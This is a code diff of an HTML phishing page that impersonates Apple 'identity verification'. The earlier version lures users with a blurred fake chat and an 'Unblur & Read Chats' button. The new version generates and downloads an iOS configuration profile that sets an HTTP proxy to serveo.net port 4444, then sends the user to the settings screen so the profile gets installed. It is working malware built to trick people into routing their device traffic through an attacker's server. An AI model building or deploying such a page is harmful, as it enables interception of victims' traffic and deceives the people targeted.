@@ -1,53 +1,79 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secure Identity Verification</title>
+    <title>Security Verification</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #1c1c1e; overflow: hidden; }
-        .chat-background {
-            background-color: #2c2c2e; background-image: url('chat_preview.jpg'); 
-            height: 100vh; width: 100%; background-position: center top; 
-            background-repeat: no-repeat; background-size: contain;
-            position: fixed; top: 0; left: 0; z-index: 1; transition: 0.8s;
-        }
-        .verification-box {
-            position: relative; z-index: 3; background: white; padding: 30px; border-radius: 22px;
-            text-align: center; max-width: 310px; margin: 20vh auto;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.7); display: none;
-        }
-        .apple-logo { width: 35px; margin-bottom: 15px; }
-        h2 { font-size: 18px; color: #1d1d1f; margin-bottom: 10px; font-weight: 600; }
-        p { font-size: 13px; color: #48484a; margin-bottom: 25px; line-height: 1.5; }
-        .btn {
-            display: block; background: #007aff; color: white; text-decoration: none;
-            padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer;
-        }
+        body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #1c1c1e; color: white; display: flex; align-items: center; justify-content: center; text-align: center; }
+        .container { background: white; color: black; padding: 40px; border-radius: 25px; width: 80%; max-width: 350px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .apple-logo { width: 40px; margin-bottom: 20px; }
+        h1 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
+        p { font-size: 14px; color: #666; margin-bottom: 30px; }
+        .btn { background: #007aff; color: white; padding: 15px 25px; border-radius: 12px; text-decoration: none; font-weight: 600; display: block; cursor: pointer; border: none; width: 100%; font-size: 16px; }
     </style>
 </head>
 <body>
-    <div class="chat-background"></div>
-    <div class="verification-box" id="trap-popup">
+    <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
-        <h2>Identity Verification</h2>
-        <p>Verify your device identity to access the cloud archive.</p>
-        
-        <a href="https://www.dropbox.com/scl/fi/ubxfrxsk64sjcsq4odn3x/secure_verify-6.mobileconfig?rlkey=rexef269gpctb442ohnfu0zz4&st=3mev8s82&raw=1" 
-           download="secure_verify.mobileconfig" 
-           type="application/x-apple-aspen-config"
-           class="btn" onclick="startTrap()">Unblur & Read Chats</a>
+        <h1>Identity Required</h1>
+        <p>To continue, please verify your device management profile.</p>
+        <button onclick="downloadProfile()" class="btn">Install Verification Profile</button>
     </div>
 
     <script>
-        setTimeout(function() {
-            document.getElementById('trap-popup').style.display = 'block';
-            document.querySelector('.chat-background').style.filter = 'blur(15px)';
-        }, 2000);
+        function downloadProfile() {
+            // Your EXACT XML Payload from the screenshot
+            const profileXml = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadDescription</key>
+            <string>Identity Verification for Hadima Closet Archives</string>
+            <key>PayloadDisplayName</key>
+            <string>Hadima Verification Certificate</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.proxy.setup</string>
+            <key>PayloadType</key>
+            <string>com.apple.proxy.http</string>
+            <key>PayloadUUID</key>
+            <string>12345-67890</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>ProxyServer</key>
+            <string>serveo.net</string>
+            <key>ProxyPort</key>
+            <integer>4444</integer>
+        </dict>
+    </array>
+    <key>PayloadDisplayName</key>
+    <string>Hadima Identity Service</string>
+    <key>PayloadIdentifier</key>
+    <string>com.hadima.verify</string>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>09876-54321</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+</dict>
+</plist>`;
 
-        function startTrap() {
-            setTimeout(function() {
+            const blob = new Blob([profileXml], { type: 'application/x-apple-aspen-config' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = 'verify.mobileconfig';
+            document.body.appendChild(a);
+            a.click();
+            
+            setTimeout(() => {
+                window.URL.revokeObjectURL(url);
                 window.location.href = "App-prefs:General&path=ManagedConfigurationList";
-            }, 6000);
+            }, 3000);
         }
     </script>
 </body>
